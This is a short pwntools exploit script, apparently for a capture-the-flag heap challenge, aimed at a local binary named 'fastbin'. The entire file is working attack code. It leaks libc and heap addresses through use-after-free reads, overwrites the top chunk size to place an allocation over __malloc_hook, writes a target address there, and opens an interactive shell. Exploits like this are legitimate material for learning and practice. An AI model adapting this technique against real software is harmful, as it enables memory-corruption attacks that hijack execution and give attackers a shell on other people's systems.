from pwn import *
context.log_level = 'debug'
sh = process('./fastbin')


def new(idx,size,cont):
	sh.sendlineafter('> ','1 '+str(idx))
	sh.sendlineafter('size:\n',str(size))
	sh.sendlineafter('ent:\n',cont)

def delete(idx):
        sh.sendlineafter('> ','2 '+str(idx))

def show(idx):
	sh.sendlineafter('> ','3 '+str(idx))

#-----------leak libc_base---------------------
new(0,0x20,'a')
new(1,0x120,'b')
new(2,0x20,'c')
new(3,0x20,'d')

delete(1)
show(1)
leak_addr = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))
malloc_hook = leak_addr - 88 -0x10
libc_base = leak_addr - 88 - 0x3c4b20
print hex(leak_addr)
print "libc_base: "+hex(libc_base)
new(1,0x120,'b')
#gdb.attach(sh)

#--------hjack topchunk above malloc hook-----
delete(2)
delete(3)
show(3)
leak_addr = u64(sh.recvuntil('\n',drop=True).ljust(8,'\x00'))
old_top = leak_addr +0x60
print "old_top: "+hex(old_top)
new_top = malloc_hook-0x10
req = new_top- old_top- 0x10
print "req: "+ hex(req)

new(3,0x20,'f'*0x20+'\x00'*8+p64(req+0x1000))
#gdb.attach(sh)
new(2,0x20,'xxxxxxx')
#gdb.attach(sh)
for i in range(req/0x10000):
	new(4,0x10000,'')

system_addr = 0x400816
new(5,0x20,p64(system_addr)+"/bin/sh\x00")

gdb.attach(sh)
sh.interactive()
